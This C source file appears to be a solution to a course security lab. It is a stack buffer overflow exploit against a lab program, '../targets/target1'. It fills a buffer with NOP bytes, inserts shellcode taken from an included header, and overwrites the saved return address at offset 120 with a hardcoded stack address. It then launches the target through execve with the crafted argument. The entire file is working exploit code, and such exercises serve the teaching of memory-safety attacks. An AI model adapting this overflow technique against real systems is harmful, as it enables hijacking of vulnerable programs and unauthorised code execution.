#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target1"
#define ADDR 0x3021fe50
#define NOP 0x90
#define BUF_SIZE 125 // fec8 - fe50 = 120; add 4 bytes for the return addr

// through the cmd line, we know the following addr,
// lab_main starts at 0x3021fec8
// buf starts at 0x3021fe50
int main(int argc, char *argv[]) {
    char *args[3];
    char *env[1];
    char *ptr;
    long *addr_ptr;

    char buff[BUF_SIZE];
    int i;

    ptr = buff;
    addr_ptr = (long *) (&buff[120]);

    for (i = 0; i < BUF_SIZE; i++)
        buff[i] = NOP;
    for (i = 0; i < strlen(shellcode); i++)
        *(ptr++) = shellcode[i];
    *(addr_ptr) = ADDR;
    buff[BUF_SIZE-1] = '\0';

    args[0] = TARGET;
    args[1] = buff;
    args[2] = NULL;

    env[0] = NULL;

    if (execve(TARGET, args, env) < 0)
        fprintf(stderr, "execve failed.\n");

    return (0);
}
